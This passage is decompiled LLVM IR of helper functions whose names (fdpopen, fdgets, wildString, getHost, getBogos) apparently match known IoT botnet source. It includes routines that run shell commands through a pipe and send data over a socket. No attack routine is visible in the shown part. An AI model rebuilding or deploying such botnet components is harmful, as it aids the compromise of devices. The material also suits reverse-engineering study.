  %v2_931c = inttoptr i32 %v1_9300 to i8*
  %v3_931c = call i32 @__GI_memset(i8* %v2_931c, i32 0)
  %v2_9328 = ptrtoint i32* %stack_var_-8 to i32
  %v4_9348 = call i32 @print(i32* nonnull %stack_var_-40, i32 %arg2, i32 %v2_9328)
  %v3_9350 = call i32 @strlen(i8* %v2_931c)
  %v2_9360 = add i32 %v3_9350, %v1_9300
  %v3_9368 = inttoptr i32 %v2_9360 to i8*
  store i8 10, i8* %v3_9368, align 1
  %v3_9370 = call i32 @strlen(i8* %v2_931c)
  %v3_9378 = load i32, i32* %stack_var_-48, align 4
  %v4_9388 = inttoptr i32 %v1_9300 to i32*
  %v5_9388 = call i32 @__libc_send(i32 %v3_9378, i32* %v4_9388, i32 %v3_9370, i32 16384)
  %v1_9398 = call i32 @free(i32 %v1_9300)
  store i32 %v3_92ec, i32* @fp, align 4
  ret i32 %v5_9388

; uselistorder directives
  uselistorder i8* %v2_931c, { 1, 0, 2 }
  uselistorder i32 %v1_9300, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_93b0 = load i32, i32* @fp, align 4
  store i32 37816, i32* %stack_var_-4, align 4
  %v2_93b4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_93b4, i32* @fp, align 4
  %v2_93c8 = load i8, i8* %arg2, align 1
  %v7_93cc = icmp eq i8 %v2_93c8, 114
  br i1 %v7_93cc, label %dec_label_pc_93e4, label %dec_label_pc_93d4

dec_label_pc_93d4:                                ; preds = %entry
  %v2_93d8 = load i8, i8* %arg2, align 1
  %v7_93dc = icmp eq i8 %v2_93d8, 119
  br i1 %v7_93dc, label %dec_label_pc_93e4, label %dec_label_pc_93f8

dec_label_pc_93e4:                                ; preds = %dec_label_pc_93d4, %entry
  %v1_93e8 = add i32 %tmp, 1
  %v1_93ec = inttoptr i32 %v1_93e8 to i8*
  %v2_93ec = load i8, i8* %v1_93ec, align 1
  %v2_93f0 = icmp eq i8 %v2_93ec, 0
  br i1 %v2_93f0, label %dec_label_pc_9404, label %dec_label_pc_93f8

dec_label_pc_93f8:                                ; preds = %dec_label_pc_93d4, %dec_label_pc_93e4
  br label %dec_label_pc_9614

dec_label_pc_9404:                                ; preds = %dec_label_pc_93e4
  %v2_9404 = ptrtoint i32* %stack_var_-32 to i32
  %v1_940c = call i32 @__GI_pipe(i32 %v2_9404)
  %v1_9414 = icmp slt i32 %v1_940c, 0
  br i1 %v1_9414, label %dec_label_pc_941c, label %dec_label_pc_9428

dec_label_pc_941c:                                ; preds = %dec_label_pc_9404
  br label %dec_label_pc_9614

dec_label_pc_9428:                                ; preds = %dec_label_pc_9404
  %v2_942c = load i32, i32* @global_var_2d928.54, align 4
  %v2_9430 = icmp eq i32 %v2_942c, 0
  br i1 %v2_9430, label %dec_label_pc_9438, label %dec_label_pc_94bc

dec_label_pc_9438:                                ; preds = %dec_label_pc_9428
  %v0_9438 = call i32 @getdtablesize()
  %v5_944c = icmp sgt i32 %v0_9438, 0
  br i1 %v5_944c, label %dec_label_pc_945c, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_9438
  br label %dec_label_pc_9614

dec_label_pc_945c:                                ; preds = %dec_label_pc_9438
  %v3_9460 = mul i32 %v0_9438, 4
  %v1_9468 = call i32 @malloc(i32 %v3_9460)
  store i32 %v1_9468, i32* @global_var_2d928.54, align 4
  %v2_9484 = icmp eq i32 %v1_9468, 0
  br i1 %v2_9484, label %dec_label_pc_948c, label %dec_label_pc_9498

dec_label_pc_948c:                                ; preds = %dec_label_pc_945c
  br label %dec_label_pc_9614

dec_label_pc_9498:                                ; preds = %dec_label_pc_945c
  store i32 %v3_9460, i32* @r2, align 4
  %v2_94b8 = inttoptr i32 %v1_9468 to i8*
  %v3_94b8 = call i32 @__GI_memset(i8* %v2_94b8, i32 0)
  br label %dec_label_pc_94bc

dec_label_pc_94bc:                                ; preds = %dec_label_pc_9428, %dec_label_pc_9498
  %v0_94bc = call i32 @__vfork()
  %v7_94d4 = icmp eq i32 %v0_94bc, -1
  br i1 %v7_94d4, label %dec_label_pc_94ec, label %dec_label_pc_94dc

dec_label_pc_94dc:                                ; preds = %dec_label_pc_94bc
  %v2_94e0 = icmp eq i32 %v0_94bc, 0
  %v2_9514 = load i8, i8* %arg2, align 1
  %v7_9518 = icmp eq i8 %v2_9514, 114
  br i1 %v2_94e0, label %dec_label_pc_9510, label %dec_label_pc_95b0

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94bc
  %v3_94ec = load i32, i32* %stack_var_-32, align 4
  %v1_94f4 = call i32 @__libc_close(i32 %v3_94ec)
  %v1_9500 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_9614

dec_label_pc_9510:                                ; preds = %dec_label_pc_94dc
  br i1 %v7_9518, label %dec_label_pc_9520, label %dec_label_pc_9558

dec_label_pc_9520:                                ; preds = %dec_label_pc_9510
  %v7_9524 = icmp eq i32 %tmp3, 1
  br i1 %v7_9524, label %dec_label_pc_9548, label %dec_label_pc_952c

dec_label_pc_952c:                                ; preds = %dec_label_pc_9520
  %v0_9538 = call i32 @dup2()
  %v1_9544 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_9548

dec_label_pc_9548:                                ; preds = %dec_label_pc_9520, %dec_label_pc_952c
  %v3_9548 = load i32, i32* %stack_var_-32, align 4
  %v1_9550 = call i32 @__libc_close(i32 %v3_9548)
  br label %dec_label_pc_958c

dec_label_pc_9558:                                ; preds = %dec_label_pc_9510
  %v3_9558 = load i32, i32* %stack_var_-32, align 4
  %v2_955c = icmp eq i32 %v3_9558, 0
  br i1 %v2_955c, label %dec_label_pc_9580, label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_9558
  %v0_9570 = call i32 @dup2()
  %v3_9574 = load i32, i32* %stack_var_-32, align 4
  %v1_957c = call i32 @__libc_close(i32 %v3_9574)
  br label %dec_label_pc_9580

dec_label_pc_9580:                                ; preds = %dec_label_pc_9558, %dec_label_pc_9564
  %v1_9588 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_958c

dec_label_pc_958c:                                ; preds = %dec_label_pc_9548, %dec_label_pc_9580
  store i32 ptrtoint ([8 x i8]* @global_var_1e1a8.56 to i32), i32* @r0, align 4
  %v8_95a4 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1e1a8.56 to i32), i32 ptrtoint ([3 x i8]* @global_var_1dbd0.58 to i32), i32 ptrtoint ([3 x i8]* @global_var_1e1b0.60 to i32), i32 %arg1, i32 0)
  %v1_95ac = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_95b0:                                ; preds = %dec_label_pc_94dc
  br i1 %v7_9518, label %dec_label_pc_95c0, label %dec_label_pc_95d8

dec_label_pc_95c0:                                ; preds = %dec_label_pc_95b0
  %v3_95c0 = load i32, i32* %stack_var_-32, align 4
  %v1_95d0 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_95ec

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95b0
  %v3_95e0 = load i32, i32* %stack_var_-32, align 4
  %v1_95e8 = call i32 @__libc_close(i32 %v3_95e0)
  br label %dec_label_pc_95ec

dec_label_pc_95ec:                                ; preds = %dec_label_pc_95c0, %dec_label_pc_95d8
  %stack_var_-40.0 = phi i32 [ %v3_95c0, %dec_label_pc_95c0 ], [ %tmp3, %dec_label_pc_95d8 ]
  %v3_95f0 = mul i32 %stack_var_-40.0, 4
  %v2_95fc = load i32, i32* @global_var_2d928.54, align 4
  %v2_9600 = add i32 %v2_95fc, %v3_95f0
  %v2_9608 = inttoptr i32 %v2_9600 to i32*
  store i32 %v0_94bc, i32* %v2_9608, align 4
  br label %dec_label_pc_9614

dec_label_pc_9614:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_948c, %dec_label_pc_9450, %dec_label_pc_941c, %dec_label_pc_93f8, %dec_label_pc_95ec
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_941c ], [ -1, %dec_label_pc_948c ], [ -1, %dec_label_pc_94ec ], [ %stack_var_-40.0, %dec_label_pc_95ec ], [ -1, %dec_label_pc_9450 ], [ -1, %dec_label_pc_93f8 ]
  store i32 %v3_93b0, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_94bc, { 1, 2, 0 }
  uselistorder i32 %v3_9460, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 5, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9614, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_95ec, { 1, 0 }
  uselistorder label %dec_label_pc_958c, { 1, 0 }
  uselistorder label %dec_label_pc_9580, { 1, 0 }
  uselistorder label %dec_label_pc_9548, { 1, 0 }
  uselistorder label %dec_label_pc_94bc, { 1, 0 }
  uselistorder label %dec_label_pc_93f8, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_9634 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9634, i32* @ip, align 4
  %v2_964c = load i32, i32* @global_var_2d928.54, align 4
  %v2_9650 = icmp eq i32 %v2_964c, 0
  br i1 %v2_9650, label %dec_label_pc_97a4, label %dec_label_pc_9658

dec_label_pc_9658:                                ; preds = %entry
  %v3_965c = mul i32 %arg1, 4
  %v2_966c = add i32 %v2_964c, %v3_965c
  %v1_9670 = inttoptr i32 %v2_966c to i32*
  %v2_9670 = load i32, i32* %v1_9670, align 4
  %v2_9674 = icmp eq i32 %v2_9670, 0
  br i1 %v2_9674, label %dec_label_pc_97a4, label %dec_label_pc_9688

dec_label_pc_9688:                                ; preds = %dec_label_pc_9658
  %v1_968c = call i32 @__libc_close(i32 %arg1)
  %v2_9690 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_9690, i32* @r0, align 4
  %v1_9698 = call i32 @sigemptyset(i32 %v2_9690)
  store i32 %v2_9690, i32* @r0, align 4
  %v2_96a8 = call i32 @__GI_sigaddset(i32 %v2_9690, i32 2)
  store i32 %v2_9690, i32* @r0, align 4
  %v2_96b8 = call i32 @__GI_sigaddset(i32 %v2_9690, i32 3)
  store i32 %v2_9690, i32* @r0, align 4
  %v2_96c8 = call i32 @__GI_sigaddset(i32 %v2_9690, i32 1)
  %v2_96d0 = ptrtoint i32* %stack_var_-148 to i32
  %v3_96dc = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_96dc = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_96dc, i32 %v2_96d0)
  %v2_96fc = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_96e0

dec_label_pc_96e0:                                ; preds = %dec_label_pc_9724, %dec_label_pc_9688
  %v2_96f0 = load i32, i32* @global_var_2d928.54, align 4
  %v2_96f4 = add i32 %v2_96f0, %v3_965c
  %v1_96f8 = inttoptr i32 %v2_96f4 to i32*
  %v2_96f8 = load i32, i32* %v1_96f8, align 4
  %v3_970c = call i32 @__libc_waitpid(i32 %v2_96f8, i32 %v2_96fc, i32 0)
  %v3_971c = icmp eq i32 %v3_970c, -1
  %v8_971c = icmp eq i32 %v3_970c, -1
  br i1 %v3_971c, label %dec_label_pc_9724, label %dec_label_pc_9738

dec_label_pc_9724:                                ; preds = %dec_label_pc_96e0
  %v0_9724 = call i32 @__errno_location()
  %v1_972c = inttoptr i32 %v0_9724 to i32*
  %v2_972c = load i32, i32* %v1_972c, align 4
  %v7_9730 = icmp eq i32 %v2_972c, 4
  br i1 %v7_9730, label %dec_label_pc_96e0, label %dec_label_pc_9738

dec_label_pc_9738:                                ; preds = %dec_label_pc_96e0, %dec_label_pc_9724
  %v3_9748 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_9748 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_9748, i32 0)
  %v3_9750 = mul i32 %tmp6, 4
  %v2_975c = load i32, i32* @global_var_2d928.54, align 4
  %v2_9760 = add i32 %v2_975c, %v3_9750
  %v2_9768 = inttoptr i32 %v2_9760 to i32*
  store i32 0, i32* %v2_9768, align 4
  br i1 %v8_971c, label %dec_label_pc_97a4, label %dec_label_pc_9778

dec_label_pc_9778:                                ; preds = %dec_label_pc_9738
  %v3_9778 = load i32, i32* %stack_var_-280, align 4
  %v1_9784 = and i32 %v3_9778, 65280
  %v3_97881 = udiv i32 %v1_9784, 256
  br label %dec_label_pc_97a4

dec_label_pc_97a4:                                ; preds = %dec_label_pc_9778, %dec_label_pc_9738, %entry, %dec_label_pc_9658
  %storemerge4 = phi i32 [ -1, %dec_label_pc_9658 ], [ -1, %entry ], [ %v3_97881, %dec_label_pc_9778 ], [ -1, %dec_label_pc_9738 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_9690, { 1, 0, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_965c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_2d928.54, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_97a4, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_9738, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_9828

dec_label_pc_97e8:                                ; preds = %dec_label_pc_9838
  store i32 %v2_9844, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_9804 = call i32 @__libc_read(i32 %arg3)
  %v1_9814 = add nuw i32 %storemerge25, 1
  %v7_9820 = icmp eq i32 %v1_9804, 1
  br i1 %v7_9820, label %dec_label_pc_9828, label %dec_label_pc_9858

dec_label_pc_9828:                                ; preds = %entry, %dec_label_pc_97e8
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_9814, %dec_label_pc_97e8 ]
  %v6_9834 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_9834, label %dec_label_pc_9838, label %dec_label_pc_9858

dec_label_pc_9838:                                ; preds = %dec_label_pc_9828
  %v2_9844 = add i32 %storemerge25, %arg1
  %v1_9848 = add i32 %v2_9844, -1
  %v1_984c = inttoptr i32 %v1_9848 to i8*
  %v2_984c = load i8, i8* %v1_984c, align 1
  %v7_9850 = icmp eq i8 %v2_984c, 10
  br i1 %v7_9850, label %dec_label_pc_9858, label %dec_label_pc_97e8

dec_label_pc_9858:                                ; preds = %dec_label_pc_9838, %dec_label_pc_9828, %dec_label_pc_97e8
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_9838 ], [ 1, %dec_label_pc_9828 ], [ %v1_9804, %dec_label_pc_97e8 ]
  %v2_985c = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_985c, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_9844, { 1, 0 }
  uselistorder i32 %v1_9804, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9828, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_98dc3 = load i8, i8* %arg1, align 1
  %v2_98e05 = icmp eq i8 %v2_98dc3, 0
  br i1 %v2_98e05, label %dec_label_pc_98f4, label %dec_label_pc_98e8

dec_label_pc_98a8:                                ; preds = %dec_label_pc_98e8
  %v3_98ac = mul i32 %stack_var_-20.06, 16
  %v4_98b0 = ptrtoint i8* %v3_98cc to i32
  %v2_98b4 = load i8, i8* %v3_98cc, align 1
  %v3_98b4 = zext i8 %v2_98b4 to i32
  %v4_98c0 = mul nuw nsw i32 %v3_98b4, 4
  %v5_98c0 = add i32 %v4_98c0, ptrtoint (i32* @global_var_1e1b4.63 to i32)
  %v6_98c0 = inttoptr i32 %v5_98c0 to i32*
  %v7_98c0 = load i32, i32* %v6_98c0, align 4
  %v2_98c4 = or i32 %v7_98c0, %v3_98ac
  %v1_98d0 = add i32 %v4_98b0, 1
  %v5_98d4 = inttoptr i32 %v1_98d0 to i8*
  %v2_98dc = load i8, i8* %v5_98d4, align 1
  %v2_98e0 = icmp eq i8 %v2_98dc, 0
  br i1 %v2_98e0, label %dec_label_pc_98f4, label %dec_label_pc_98e8

dec_label_pc_98e8:                                ; preds = %entry, %dec_label_pc_98a8
  %v3_98cc = phi i8* [ %v5_98d4, %dec_label_pc_98a8 ], [ %arg1, %entry ]
  %stack_var_-20.06 = phi i32 [ %v2_98c4, %dec_label_pc_98a8 ], [ 0, %entry ]
  %v1_98ec = icmp slt i32 %stack_var_-20.06, 0
  br i1 %v1_98ec, label %dec_label_pc_98f4, label %dec_label_pc_98a8

dec_label_pc_98f4:                                ; preds = %dec_label_pc_98a8, %dec_label_pc_98e8, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_98c4, %dec_label_pc_98a8 ], [ %stack_var_-20.06, %dec_label_pc_98e8 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.06, { 1, 2, 0 }
  uselistorder label %dec_label_pc_98f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_98e8, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_990c = load i32, i32* @r4, align 4
  %v6_990c = load i32, i32* @fp, align 4
  store i32 39188, i32* %stack_var_-4, align 4
  %v2_9910 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9910, i32* @fp, align 4
  %v2_9924 = load i8, i8* %arg1, align 1
  %v7_9930 = icmp eq i8 %v2_9924, 42
  br i1 %v7_9930, label %dec_label_pc_9964, label %dec_label_pc_9938

dec_label_pc_9938:                                ; preds = %entry
  %v7_993c = icmp eq i8 %v2_9924, 63
  br i1 %v7_993c, label %dec_label_pc_99d4, label %dec_label_pc_9944

dec_label_pc_9944:                                ; preds = %dec_label_pc_9938
  %v2_9948 = icmp eq i8 %v2_9924, 0
  br i1 %v2_9948, label %dec_label_pc_9954, label %dec_label_pc_9a2c

dec_label_pc_9954:                                ; preds = %dec_label_pc_9944
  %v2_9958 = load i8, i8* %tmp, align 1
  %v3_9958 = zext i8 %v2_9958 to i32
  br label %dec_label_pc_9aa0

dec_label_pc_9964:                                ; preds = %entry
  %v1_9968 = add i32 %tmp8, 1
  %v3_9974 = inttoptr i32 %v1_9968 to i8*
  %v4_9974 = call i32 @wildString(i8* %v3_9974, i32 %arg2)
  %v2_997c = icmp eq i32 %v4_9974, 0
  br i1 %v2_997c, label %dec_label_pc_99c0, label %dec_label_pc_9984

dec_label_pc_9984:                                ; preds = %dec_label_pc_9964
  %v2_9988 = load i8, i8* %tmp, align 1
  %v2_998c = icmp eq i8 %v2_9988, 0
  br i1 %v2_998c, label %dec_label_pc_99c8, label %dec_label_pc_9994

dec_label_pc_9994:                                ; preds = %dec_label_pc_9984
  %v1_9998 = add i32 %arg2, 1
  %v4_99a4 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9998)
  %v2_99ac = icmp eq i32 %v4_99a4, 0
  br i1 %v2_99ac, label %dec_label_pc_99c0, label %dec_label_pc_99c8

dec_label_pc_99c0:                                ; preds = %dec_label_pc_9994, %dec_label_pc_9964
  br label %dec_label_pc_99c8

dec_label_pc_99c8:                                ; preds = %dec_label_pc_9984, %dec_label_pc_9994, %dec_label_pc_99c0
  %storemerge3 = phi i32 [ 0, %dec_label_pc_99c0 ], [ 1, %dec_label_pc_9994 ], [ 1, %dec_label_pc_9984 ]
  br label %dec_label_pc_9aa0

dec_label_pc_99d4:                                ; preds = %dec_label_pc_9938
  %v2_99d8 = load i8, i8* %tmp, align 1
  %v2_99dc = icmp eq i8 %v2_99d8, 0
  br i1 %v2_99dc, label %dec_label_pc_9a20, label %dec_label_pc_99e4

dec_label_pc_99e4:                                ; preds = %dec_label_pc_99d4
  %v1_99e8 = add i32 %tmp8, 1
  %v1_99f0 = add i32 %arg2, 1
  %v2_99fc = inttoptr i32 %v1_99e8 to i8*
  %v3_99fc = call i32 @wildString(i8* %v2_99fc, i32 %v1_99f0)
  %v2_9a04 = icmp ne i32 %v3_99fc, 0
  %. = zext i1 %v2_9a04 to i32
  br label %dec_label_pc_9a20

dec_label_pc_9a20:                                ; preds = %dec_label_pc_99e4, %dec_label_pc_99d4
  %storemerge2 = phi i32 [ 1, %dec_label_pc_99d4 ], [ %., %dec_label_pc_99e4 ]
  br label %dec_label_pc_9aa0

dec_label_pc_9a2c:                                ; preds = %dec_label_pc_9944
  %v2_9a30 = load i8, i8* %arg1, align 1
  %v3_9a30 = zext i8 %v2_9a30 to i32
  %v1_9a38 = call i32 @__GI_toupper(i32 %v3_9a30)
  store i32 %v1_9a38, i32* @r4, align 4
  %v2_9a44 = load i8, i8* %tmp, align 1
  %v3_9a44 = zext i8 %v2_9a44 to i32
  %v1_9a4c = call i32 @__GI_toupper(i32 %v3_9a44)
  %v0_9a54 = load i32, i32* @r4, align 4
  %v9_9a54 = icmp eq i32 %v0_9a54, %v1_9a4c
  br i1 %v9_9a54, label %dec_label_pc_9a5c, label %dec_label_pc_9a98

dec_label_pc_9a5c:                                ; preds = %dec_label_pc_9a2c
  %v1_9a60 = add i32 %tmp8, 1
  %v1_9a68 = add i32 %arg2, 1
  %v2_9a74 = inttoptr i32 %v1_9a60 to i8*
  %v3_9a74 = call i32 @wildString(i8* %v2_9a74, i32 %v1_9a68)
  %v2_9a7c = icmp ne i32 %v3_9a74, 0
  %.7 = zext i1 %v2_9a7c to i32
  br label %dec_label_pc_9a98

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9a5c, %dec_label_pc_9a2c
  %storemerge = phi i32 [ 1, %dec_label_pc_9a2c ], [ %.7, %dec_label_pc_9a5c ]
  br label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %dec_label_pc_9a20, %dec_label_pc_99c8, %dec_label_pc_9954, %dec_label_pc_9a98
  %stack_var_-44.0 = phi i32 [ %storemerge3, %dec_label_pc_99c8 ], [ %storemerge2, %dec_label_pc_9a20 ], [ %v3_9958, %dec_label_pc_9954 ], [ %storemerge, %dec_label_pc_9a98 ]
  store i32 %v3_990c, i32* @r4, align 4
  store i32 %v6_990c, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_9aa0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_99c8, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_9ad0 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_9ad0, i32* %arg2, align 4
  %v3_9ae8 = icmp eq i32 %v1_9ad0, -1
  %. = zext i1 %v3_9ae8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i8*, align 4
  %v0_9b24 = load i32, i32* %r0.global-to-local, align 4
  %storemerge1 = inttoptr i32 %v0_9b24 to i8*
  store i8* %storemerge1, i8** %stack_var_-20, align 4
  %v2_9b5c2 = load i8, i8* %storemerge1, align 1
  %v2_9b604 = icmp eq i8 %v2_9b5c2, 0
  br i1 %v2_9b604, label %dec_label_pc_9b68, label %dec_label_pc_9b2c

dec_label_pc_9b2c:                                ; preds = %entry, %dec_label_pc_9b2c
  %v2_9b687 = phi i8* [ %storemerge, %dec_label_pc_9b2c ], [ %storemerge1, %entry ]
  %v2_9b30 = load i8, i8* %v2_9b687, align 1
  %v3_9b30 = zext i8 %v2_9b30 to i32
  store i32 %v3_9b30, i32* %r0.global-to-local, align 4
  %v1_9b38 = call i32 @__GI_toupper(i32 %v3_9b30)
  store i32 %v1_9b38, i32* %r0.global-to-local, align 4
  %v3_9b44 = load i8*, i8** %stack_var_-20, align 4
  %v1_9b48 = trunc i32 %v1_9b38 to i8
  store i8 %v1_9b48, i8* %v3_9b44, align 1
  %v4_9b4c = ptrtoint i8* %v3_9b44 to i32
  %v1_9b50 = add i32 %v4_9b4c, 1
  %storemerge = inttoptr i32 %v1_9b50 to i8*
  store i8* %storemerge, i8** %stack_var_-20, align 4
  %v2_9b5c = load i8, i8* %storemerge, align 1
  %v2_9b60 = icmp eq i8 %v2_9b5c, 0
  br i1 %v2_9b60, label %dec_label_pc_9b58.dec_label_pc_9b68_crit_edge, label %dec_label_pc_9b2c

dec_label_pc_9b58.dec_label_pc_9b68_crit_edge:    ; preds = %dec_label_pc_9b2c
  %v13_9b68.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9b68

dec_label_pc_9b68:                                ; preds = %dec_label_pc_9b58.dec_label_pc_9b68_crit_edge, %entry
  %v13_9b68 = phi i32 [ %v13_9b68.pre, %dec_label_pc_9b58.dec_label_pc_9b68_crit_edge ], [ %v0_9b24, %entry ]
  ret i32 %v13_9b68

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9b2c, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9b70 = load i32, i32* @fp, align 4
  store i32 %v3_9b70, i32* %stack_var_-16, align 4
  %v13_9b70 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v13_9b70, i32* @r2, align 4
  %v4_9b98 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e5b4.65, i32 0, i32 0), i32 0)
  %v2_9d5c = ptrtoint i32* %stack_var_-4120 to i32
  %v1_9bb8 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9d54

dec_label_pc_9ba8:                                ; preds = %dec_label_pc_9d54
  %v2_9bb8 = call i32 @uppercase(i8* %v1_9bb8)
  %v4_9bd0 = call i32 @strstr(i32 %v2_9d5c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e5c4.67, i32 0, i32 0))
  %v9_9be8 = icmp eq i32 %v4_9bd0, %v2_9d5c
  br i1 %v9_9be8, label %dec_label_pc_9bf0, label %dec_label_pc_9d38

dec_label_pc_9bf0:                                ; preds = %dec_label_pc_9ba8
  %tmp18 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_9c14

dec_label_pc_9c08:                                ; preds = %dec_label_pc_9c34, %dec_label_pc_9c24, %dec_label_pc_9c14
  %v1_9c0c = add i32 %v4_9c14, 1
  %v5_9c10 = inttoptr i32 %v1_9c0c to i8*
  br label %dec_label_pc_9c14

dec_label_pc_9c14:                                ; preds = %dec_label_pc_9bf0, %dec_label_pc_9c08
  %storemerge2 = phi i8* [ %v5_9c10, %dec_label_pc_9c08 ], [ %tmp18, %dec_label_pc_9bf0 ]
  %v4_9c14 = ptrtoint i8* %storemerge2 to i32
  %v2_9c18 = load i8, i8* %storemerge2, align 1
  %v7_9c1c = icmp eq i8 %v2_9c18, 32
  br i1 %v7_9c1c, label %dec_label_pc_9c08, label %dec_label_pc_9c24

dec_label_pc_9c24:                                ; preds = %dec_label_pc_9c14
  %v2_9c28 = load i8, i8* %storemerge2, align 1
  %v7_9c2c = icmp eq i8 %v2_9c28, 9
  br i1 %v7_9c2c, label %dec_label_pc_9c08, label %dec_label_pc_9c34

dec_label_pc_9c34:                                ; preds = %dec_label_pc_9c24
  %v2_9c38 = load i8, i8* %storemerge2, align 1
  %v7_9c3c = icmp eq i8 %v2_9c38, 58
  br i1 %v7_9c3c, label %dec_label_pc_9c08, label %dec_label_pc_9c70.preheader

dec_label_pc_9c70.preheader:                      ; preds = %dec_label_pc_9c34
  %v2_9c88 = add i32 %v4_9c14, -1
  br label %dec_label_pc_9c70

dec_label_pc_9c48:                                ; preds = %dec_label_pc_9c9c, %dec_label_pc_9c70
  %v3_9c50 = call i32 @strlen(i8* %storemerge2)
  %v1_9c64 = add i32 %v2_9c88, %v3_9c50
  %v3_9c6c = inttoptr i32 %v1_9c64 to i8*
  store i8 0, i8* %v3_9c6c, align 1
  br label %dec_label_pc_9c70

